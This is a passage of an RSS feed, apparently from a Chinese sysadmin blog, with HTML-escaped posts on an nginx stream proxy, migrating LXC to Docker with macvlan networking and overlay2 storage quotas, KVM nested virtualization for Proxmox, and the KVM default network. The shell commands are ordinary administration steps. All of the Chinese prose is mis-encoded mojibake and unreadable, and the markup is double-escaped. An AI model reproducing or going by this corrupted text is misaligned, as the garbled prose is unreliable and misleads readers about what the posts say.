&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        listen 172.18.19.10:80&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        proxy_timeout 20s&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        proxy_pass stream_backend01&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;   
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ï¼š
1ã€æ‰“å‡ºäº†tcp-access.log
2ã€æ ¹æ®æºIPåšhashï¼Œå¼ºåˆ¶åˆ†é…åˆ°åé¢çš„åŒä¸€å°æœåŠ¡å™¨ä¸Šï¼Œä¿è¯ä¸€è‡´æ€§
3ã€åç«¯çš„serverå¯ä»¥æœ‰æƒé‡ï¼Œæœ€å¤§è¿æ¥ï¼Œä»¥åŠå¤±æ•ˆæ£€æµ‹ï¼ˆ30så†…æ— æ³•è¿é€š2æ¬¡ï¼Œå°±æ‘˜æ‰è¿™ä¸ªæœåŠ¡å™¨ï¼‰&lt;/p&gt;</description>
    </item>
    <item>
      <title>LXCæ›´æ–°åˆ°Dockerä¹‹åçš„IPéƒ¨åˆ†ä¿®æ”¹</title>
      <link>https://rendoumi.com/posts/20231214-lxc_ip/</link>
      <pubDate>Thu, 14 Dec 2023 15:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231214-lxc_ip/</guid>
      <description>&lt;p&gt;åœ¨k8sæ²¡æœ‰å‡ºæ¥ä¹‹å‰ï¼Œæˆ‘ä»¬ç”¨çš„å°±æ˜¯LXCï¼Œå¤æ—©ç‰ˆæœ¬äº†ã€‚&lt;/p&gt;
&lt;p&gt;è·‘çš„LXCï¼ŒåŸºäºdockerè¿›è¡Œç®¡ç†ï¼Œç½‘ç»œéƒ¨åˆ†ç‹¬ç«‹ã€‚&lt;/p&gt;
&lt;p&gt;è¿›åŒ–åˆ°æ–°ç‰ˆæœ¬çš„Dockeråï¼Œç½‘ç»œéƒ¨åˆ†éœ€è¦ä¿®æ”¹ï¼Œæˆ‘ä»¬å†³å®šé‡‡ç”¨macvlanæ–¹å¼æ‰å¹³ç›´æ¥æ¥å…¥æœ¬åœ°ç½‘ç»œï¼š&lt;/p&gt;
&lt;p&gt;Dockerè£…å¥½ä»¥åï¼Œç³»ç»Ÿä¸­ä¼šå‡ºç°ä¸€ä¸ªDocker0çš„ç½‘ç»œï¼Œç”¨æ¥NATï¼Œæˆ‘ä»¬ä¸ç”¨è¿™ä¸ª&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2: eth0: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu &lt;span class=&#34;m&#34;&gt;1500&lt;/span&gt; qdisc pfifo_fast state UP group default qlen &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    link/ether 52:54:00:14:ee:63 brd ff:ff:ff:ff:ff:ff
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    inet 172.18.31.33/24 brd 172.18.31.255 scope global eth0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       valid_lft forever preferred_lft forever
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;3: docker0: &amp;lt;NO-CARRIER,BROADCAST,MULTICAST,UP&amp;gt; mtu &lt;span class=&#34;m&#34;&gt;1500&lt;/span&gt; qdisc noqueue state DOWN group default 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    link/ether 02:42:ef:af:de:98 brd ff:ff:ff:ff:ff:ff
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       valid_lft forever preferred_lft forever
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬è¦åšçš„æ˜¯å¯¹eth0åšmacvlanï¼Œä¸åšä»»ä½•iptableï¼Œç›´æ¥æ¥å…¥æœ¬åœ°ç½‘ç»œ&lt;/p&gt;
&lt;p&gt;å®¿ä¸»æœºip: 172.18.31.33
Docker1: 172.18.31.35&lt;/p&gt;
&lt;p&gt;ä¸€ã€å»ºmacvlan&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker network create -d macvlan &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    --subnet&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;172.18.31.0/24 --gateway&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;172.18.31.254 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    -o &lt;span class=&#34;nv&#34;&gt;parent&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;eth0 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    macvlan0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker network ls
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker inspect macvlan0
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¼šçœ‹åˆ°&lt;/p&gt;</description>
    </item>
    <item>
      <title>LXCæ›´æ–°åˆ°Dockerä¹‹åçš„å­˜å‚¨éƒ¨åˆ†ä¿®æ”¹</title>
      <link>https://rendoumi.com/posts/20231214-lxc_storage/</link>
      <pubDate>Thu, 14 Dec 2023 14:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231214-lxc_storage/</guid>
      <description>&lt;p&gt;åœ¨k8sæ²¡æœ‰å‡ºæ¥ä¹‹å‰ï¼Œæˆ‘ä»¬ç”¨çš„å°±æ˜¯LXCï¼Œå¤æ—©ç‰ˆæœ¬äº†ã€‚&lt;/p&gt;
&lt;p&gt;é‚£æ—¶å€™æ˜¯1ï¼š60çš„è™šæ‹Ÿï¼Œä¸€å°ç‰©ç†æœºä¸Šè·‘60ä¸ªLXCï¼Œå±…ç„¶è¿™æ ·è¿è¡Œäº†8å¹´æ— å¼‚å¸¸ï¼Œç°åœ¨è¦å‡çº§ä¸€ä¸‹äº†ã€‚&lt;/p&gt;
&lt;p&gt;é‚£æ—¶å€™çš„LXCï¼Œå­˜å‚¨ç©ºé—´æ— æ³•å•ç‹¬è®¾å®šï¼ˆç¼ºçœ10Gï¼‰ï¼Œcpuå’Œmemçš„limitä¹Ÿæœ‰è¿™æ ·é‚£æ ·çš„é—®é¢˜ã€‚&lt;/p&gt;
&lt;p&gt;è¿›åŒ–åˆ°æ–°ç‰ˆæœ¬çš„Dockeråï¼Œå­˜å‚¨éƒ¨åˆ†ä¹Ÿéœ€è¦ä¿®æ”¹ï¼Œæˆ‘ä»¬é‡‡ç”¨overlay2ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker info
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Storage Driver: overlay2
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  Backing Filesystem: xfs
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  Supports d_type: &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  Native Overlay Diff: &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç¼ºçœçš„å°±æ˜¯overlay2å’Œxfs&lt;/p&gt;
&lt;p&gt;ä¸€ã€ä¿®æ”¹bootå†…æ ¸å¯åŠ¨å‚æ•°&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /etc/default/grub
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#åŠ ä¸Šrootflags=uquota,pquota&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;GRUB_CMDLINE_LINUX&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;console=tty0 crashkernel=auto net.ifnames=0 console=ttyS0 rootflags=uquota,pquota&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#æ›´æ–°&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;grub2-mkconfig -o /boot/grub2/grub.cfg
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#é‡å¯&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;reboot
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;äºŒã€æ£€éªŒå¹¶å¯åŠ¨å®¹å™¨&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /proc/mounts  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep vda
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/dev/vda1 / xfs rw,relatime,attr2,inode64,usrquota,prjquota &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æœ‰prjquotaå³å¯&lt;/p&gt;
&lt;p&gt;æŒ‰éœ€å¯åŠ¨å®¹å™¨ï¼ŒæŒ‡å®šç©ºé—´å¤§å°ï¼Œsize=2G&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker run --rm -dit --name&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;t36 --storage-opt &lt;span class=&#34;nv&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;2G --net macvlan0 --ip&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;172.18.31.36 alpine:latest ash
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker &lt;span class=&#34;nb&#34;&gt;exec&lt;/span&gt; -it t36 ash
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;df -h
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231214-lxc_storage/2020-08-24_104720.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>KVMçš„åµŒå¥—è™šæ‹ŸåŒ–</title>
      <link>https://rendoumi.com/posts/20231214-kvm_nested/</link>
      <pubDate>Thu, 14 Dec 2023 13:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231214-kvm_nested/</guid>
      <description>&lt;p&gt;kvmç”Ÿäº§çš„è™šæœºå†…ä»ç„¶å¯ä»¥å†äº§è™šæ‹Ÿæœºï¼Œè¿™å°±æ˜¯åµŒå¥—è™šæ‹ŸåŒ–&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬çš„ç›®çš„æ˜¯è¦å†kvmè™šæœºä¸­å®‰è£…ä¸€å¥—proxmoxçš„ç³»ç»Ÿ&lt;/p&gt;
&lt;p&gt;é¦–å…ˆåœ¨å®ä½“æœºä¸Šæ£€æŸ¥å½“å‰çš„Linuxæ˜¯å¦æ”¯æŒåµŒå¥—&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Intelçš„CPU
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /sys/module/kvm_intel/parameters/nested
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;AMDçš„CPU
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /sys/module/kvm_amd/parameters/nested
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;â€‹
ä¿®æ”¹æ”¯æŒï¼Œä»¥intelä¸ºä¾‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /etc/modprobe.d/kvm.conf
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;options kvm_intel &lt;span class=&#34;nv&#34;&gt;nested&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;rebootå°±å¥½&lt;/p&gt;
&lt;p&gt;ä¸é‡å¯çš„è¯ï¼Œå¯ä»¥å…ˆå¸è½½æ¨¡å—ï¼Œç„¶åé‡æ–°åŠ è½½&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;modprobe -r kvm_intel
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;modprobe kvm_intel
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åæ£€æŸ¥ä¸€ä¸‹&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /sys/module/kvm_intel/parameters/nested
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;proxmoxå®‰è£…çš„æ—¶å€™ï¼ŒæŒ‡å®šcpu=hostï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/sh
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;qemu-img create -f qcow2 /export/kvm/proxmox-168-86-103/proxmox-168-86-103.qcow2 200G
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;virt-install &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --name&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;proxmox-168-86-103 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --cpu&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;host &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --ram&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;8192&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --disk &lt;span class=&#34;nv&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/export/kvm/proxmox-168-86-103/proxmox-168-86-103.qcow2,format&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;qcow2,size&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --cdrom&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/export/kvm/iso/proxmox-ve_7.0-2.iso &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --os-type&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Linux  &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --network &lt;span class=&#34;nv&#34;&gt;bridge&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;br0 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --vnc --vnclisten&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0.0.0.0 --vncport&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;5903&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>KVMç½‘ç»œå¦‚ä½•è®¾ç½®DHCP</title>
      <link>https://rendoumi.com/posts/20231214-kvm_dhcp/</link>
      <pubDate>Thu, 14 Dec 2023 07:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231214-kvm_dhcp/</guid>
      <description>&lt;p&gt;ç¼ºçœæƒ…å†µä¸‹kvmä¼šä¿ç•™ä¸€ä¸ªnatçš„ç½‘ç»œï¼Œip aå‘½ä»¤æŸ¥çœ‹ï¼Œä¼šçœ‹åˆ°virbr0å’Œvirbr0-nic&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;8: virbr0: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu &lt;span class=&#34;m&#34;&gt;1500&lt;/span&gt; qdisc noqueue state UNKNOWN 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   link/ether 52:54:00:6c:22:2c brd ff:ff:ff:ff:ff:ff
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;9: virbr0-nic: &amp;lt;BROADCAST,MULTICAST&amp;gt; mtu &lt;span class=&#34;m&#34;&gt;1500&lt;/span&gt; qdisc noop state DOWN qlen &lt;span class=&#34;m&#34;&gt;500&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   link/ether 52:54:00:6c:22:2c brd ff:ff:ff:ff:ff:ff
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™ä¸ªå¦‚æœè™šæœºéƒ½æ˜¯é™æ€IPï¼Œä¸”ä¸åšNATçš„è¯ï¼Œåˆ™æ— å¿…è¦ä¿ç•™ï¼Œå¯ä»¥å½»åº•åˆ æ‰ã€‚&lt;/p&gt;
&lt;p&gt;kvmåˆ é™¤æ‰ç¼ºçœç½‘ç»œ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;virsh net-destroy default
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;virsh net-undefine default
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é‚£ä¹ˆå¦‚æœéç”¨ä¸å¯ï¼Œè¿˜éœ€è¦ç»™ç‰¹å®šè™šæœºç”¨dhcpæŒ‡å®šå›ºå®šIP
æ–¹æ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;æŸ¥çœ‹ç¼ºçœç½‘ç»œ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ virsh net-list
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Name                 State      Autostart     Persistent
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;----------------------------------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; default              active     yes           yes
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ‰¾å‡ºè™šæœºçš„macåœ°å€&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;virsh&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dumpxml&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;vis&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;33&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;grep&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;mac&amp;#39;&lt;/span&gt;
